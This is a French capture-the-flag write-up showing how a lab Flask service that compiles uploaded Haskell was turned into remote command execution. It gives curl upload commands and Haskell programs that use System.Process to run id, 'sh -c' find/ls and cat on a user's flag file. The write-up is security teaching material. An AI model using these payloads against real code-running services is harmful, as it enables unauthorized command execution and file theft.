    # Fun With Functional

> **Catégorie :** Web / Upload / RCE via exécution de code Haskell
> **Cible :** `http://10.10.0.8:5001/homework`
> **Flag :** `EPI{h4sK377_C4n_83_r3vsh3ll_4s_W3lL}`

---

## Objectif

Un service web demande d'envoyer un programme **Haskell** qui sera « corrigé »
par un outil automatique. Corriger du Haskell implique de le **compiler et
l'exécuter** — c'est le point d'entrée. Le but est de transformer cette
exécution de code Haskell en exécution de commandes système (RCE) et de lire le
flag.

**Méthode générale :** on n'avance qu'à partir de ce qui est **confirmé par la
réponse précédente**, jamais sur une supposition. Chaque test valide une
hypothèse avant de passer à l'étape suivante.

---

## Étape 1 — Reconnaissance de la page

```bash
curl -sv http://10.10.0.8:5001/homework
```

- `-s` → mode silencieux (pas de barre de progression)
- `-v` → verbose : affiche les en-têtes de la requête et de la réponse

**Ce qu'on observe dans la réponse :**

- En-tête `Server: Werkzeug/3.1.8 Python/3.13.5` → c'est une appli **Flask**
  (Python) qui sert de backend au challenge.
- Le HTML contient un formulaire d'upload :

```html
<form method=post enctype=multipart/form-data>
  <input type=file name=file>
  <input type=submit value=Upload>
</form>
```

→ upload de fichier, champ nommé `file`, en POST sur l'URL courante
(`/homework`, pas d'`action=` précisé).

- Le texte explique : *« Send me a haskell program... It will then be sent to an
  autocorrect tool that will correct it »*.

**Déduction :** le serveur ne se contente pas de stocker le fichier — il le passe
à un outil qui le traite. Un outil qui « corrige » du Haskell doit le
**compiler** pour vérifier qu'il est valide. Compiler = exécuter `ghc` ou
équivalent. C'est le point d'entrée à tester.

---

## Étape 2 — Vérifier que le code s'exécute réellement (test inoffensif)

On ne part jamais directement sur une attaque : on teste d'abord avec quelque
chose de **neutre** pour observer le comportement exact du système.

```bash
cat > love.hs << 'EOF'
main :: IO ()
main = putStrLn "I love Haskell"
EOF

curl -svL -F "file=@love.hs" http://10.10.0.8:5001/homework
```

- `-F "file=@love.hs"` → envoie le fichier en `multipart/form-data`, sur le champ
  `file` repéré à l'étape 1
- `-L` → suit automatiquement les redirections

**Résultat observé :**

- `302 FOUND` → `Location: /uploads/love.hs`
- En suivant ce lien (grâce à `-L`), on tombe sur un fichier
  `love.hs_results.txt` contenant :

```
I love Haskell
```

**Ce que ça confirme :** le serveur a réellement **exécuté** le programme (pas
juste vérifié la syntaxe), et il **renvoie stdout** dans un fichier accessible
publiquement. C'est la faille : exécution de code arbitraire côté serveur (RCE),
avec le résultat qui nous revient directement.

---

## Étape 3 — Passer de « exécuter du Haskell » à « exécuter des commandes système »

Haskell « pur » ne touche pas à l'OS. Mais sa bibliothèque standard inclut
`System.Process`, qui permet de lancer des processus externes (l'équivalent de
`os.system()` en Python). On teste si ce module est utilisable sans restriction :

```bash
cat > pwn.hs << 'EOF'
import System.Process
import System.IO

main :: IO ()
main = do
    out <- readProcess "id" [] ""
    putStrLn out
EOF

curl -svL -F "file=@pwn.hs" http://10.10.0.8:5001/homework
```

- `readProcess "id" [] ""` → exécute la commande `id`, sans arguments, sans
  entrée standard, et récupère sa sortie.

**Résultat :**

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Ce que ça confirme :**

- aucun sandboxing, aucun blocage sur les imports → on peut exécuter n'importe
  quelle commande shell via Haskell ;
- on tourne en tant que `www-data` ;
- **bonus** dans les logs de compilation :
  `Compiling Main ( /var/www/html/uploads/pwn.hs, ... )` → on connaît maintenant
  le **chemin absolu** du serveur.

---

## Étape 4 — Chercher le flag (reconnaissance ciblée)

Dans un contexte CTF/HTB, le flag `user.txt` est presque toujours dans
`/home/<utilisateur>/`. Plutôt que deviner le nom d'utilisateur, on fait chercher
le système lui-même :

```bash
cat > flag.hs << 'EOF'
import System.Process

main :: IO ()
main = do
    out <- readProcess "sh" ["-c", "find / -maxdepth 4 -iname 'user.txt' 2>/dev/null; echo ---; ls -la /home/ 2>/dev/null"] ""
    putStrLn out
EOF

curl -svL -F "file=@flag.hs" http://10.10.0.8:5001/homework
```

**Pourquoi `sh -c "..."` et pas juste `readProcess "find" [...]` ?**

Parce qu'on veut **chaîner** plusieurs commandes (`find` puis `ls`) avec `;` et
rediriger les erreurs (`2>/dev/null`). Ces opérateurs (`;`, `2>`) sont interprétés
par un **shell**, pas par un programme isolé. Il faut donc passer explicitement
par `sh -c` pour qu'un shell interprète toute la ligne.

**Résultat :**

```
/home/prof/user.txt
---
drwxr-xr-x 1 prof prof 4096 ... prof
```

→ Le fichier existe, et le dossier `/home/prof` a les droits `r-x` pour « others »
(donc lisible par `www-data`).

---

## Étape 5 — Lire le flag

On a le chemin exact et on sait que les permissions le permettent. Un simple
`cat` suffit :

```bash
cat > getflag.hs << 'EOF'
import System.Process

main :: IO ()
main = do
    out <- readProcess "cat" ["/home/prof/user.txt"] ""
    putStrLn out
EOF

curl -svL -F "file=@getflag.hs" http://10.10.0.8:5001/homework
```

**Résultat final :**

```
EPI{h4sK377_C4n_83_r3vsh3ll_4s_W3lL}
```

---

## Le fil conducteur général

À chaque étape, on n'avance que sur ce qui est **confirmé par la réponse
précédente**, jamais sur une supposition :

1. Le formulaire suggère un traitement → on teste avec un fichier neutre pour
   vérifier.
2. Le stdout revient → on teste si on peut appeler l'OS.
3. L'OS répond → on cherche activement le flag au lieu de deviner un chemin.
4. Le chemin est confirmé lisible → on le lit directement.

Chaque « coup » en Haskell est juste un **wrapper minimal** autour d'une commande
shell — le vrai travail se fait dans le paramètre passé à `readProcess` / `sh -c`.

---

## Concepts clés à retenir

| Concept | Explication |
|---|---|
| **RCE via upload** | Un service qui compile/exécute un fichier uploadé exécute de fait du code arbitraire. |
| **`System.Process` (Haskell)** | Permet de lancer des processus système depuis Haskell → passerelle vers le shell. |
| **`sh -c "..."`** | Nécessaire pour utiliser les opérateurs de shell (`;`, `|`, `2>`, `&&`). |
| **Méthode incrémentale** | Valider chaque hypothèse (exécution, accès OS, chemin, permissions) avant d'avancer. |
| **Fuites d'infos dans les logs** | Les messages de compilation ont révélé le chemin absolu du serveur. |

---

## Résumé de la chaîne d'attaque

```
curl /homework (recon Flask + formulaire upload) →
love.hs (confirme l'exécution + stdout renvoyé) →
pwn.hs (System.Process → RCE en www-data) →
flag.hs (sh -c find + ls → localise /home/prof/user.txt) →
getflag.hs (cat) → FLAG
